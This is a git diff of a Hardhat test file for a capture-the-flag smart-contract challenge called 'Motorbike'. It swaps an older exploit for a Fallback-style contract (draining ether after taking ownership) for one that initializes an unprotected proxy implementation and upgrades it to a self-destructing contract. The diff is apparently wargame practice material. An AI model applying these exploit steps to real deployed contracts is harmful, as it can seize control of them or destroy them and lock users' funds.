@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Example Vuln', function () {
+describe('[Challenge] Motorbike', function () {
 
     let deployer, attacker;
     
@@ -13,34 +13,53 @@ describe('[Challenge] Example Vuln', function () {
         if (chainID == 5){ // goerli testnet
             /** connect to Dapp in goerli **/
             [attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback');
-            this.target = ContractFactory.attach("");
-            
+            const MotorbikeContractFactory = await ethers.getContractFactory('Motorbike');
+            this.target = MotorbikeContractFactory.attach("0xc97fBFaC4734868B2f54CD54308e0733a5FBcfD4");
         } else { // local network - hardhat  
             /** local test **/
             [deployer, attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback', deployer);
-            this.target = await ContractFactory.deploy();
+            const EngineContractFactory = await ethers.getContractFactory('Engine', deployer);
+            const MotorbikeContractFactory = await ethers.getContractFactory('Motorbike', deployer);
+            this.engine = await EngineContractFactory.deploy();
+            this.target = await MotorbikeContractFactory.deploy(this.engine.address);
         }
     });
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
-        // Contribute to get into whitelist
-        await this.target.connect(attacker).contribute({value: some_ether});
-        // Takeover the contract's owner by sending some ethers
-        tx = {
-            to: this.target.address,
-            value: some_ether
-        };
-        await attacker.sendTransaction(tx);
-        // Withdraw all ethers in the contract
-        await this.target.connect(attacker).withdraw();
+        const EngineContractFactory = await ethers.getContractFactory('Engine');
+        let engineSlot = await ethers.provider.getStorageAt(
+            this.target.address, 
+            "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
+        );
+        let engineAddress = ethers.utils.hexDataSlice(engineSlot, 12);
+        this.engine = EngineContractFactory.attach(engineAddress);
+
+        console.log(`\t Info...`);
+        console.log(`\t target: ${this.target.address}`);
+        console.log(`\t engine: ${this.engine.address}`);
+        console.log(`\t engine upgrader: ${await this.engine.upgrader()}`);  
+
+        console.log(`\t Initializing the engine...`);
+        let initTX = await this.engine.connect(attacker).initialize({gasLimit:200000}); await initTX.wait(); 
+
+        console.log(`\t Deploying destroyer...`);
+        const EngineDestroyerFactory = await ethers.getContractFactory('EngineDestroyer', attacker);
+        const EngineDestroyer = await EngineDestroyerFactory.deploy();
+
+        console.log(`\t Destroying the engine...`);
+        let ABI = ["function destroy()"];
+        let iface = new ethers.utils.Interface(ABI);
+        let data = iface.encodeFunctionData("destroy");
+        let exploitTX = await this.engine.connect(attacker).upgradeToAndCall(
+            EngineDestroyer.address, 
+            data,{gasLimit:200000}
+        ); await exploitTX.wait();
+        
     }).timeout(0);
 
     after(async () => {
         /** SUCCESS CONDITIONS */
-        expect(await this.target.owner()).to.be.eq(attacker.address);
+        expect(await ethers.provider.getCode(this.engine.address)).to.be.eq("0x");
     });
 });
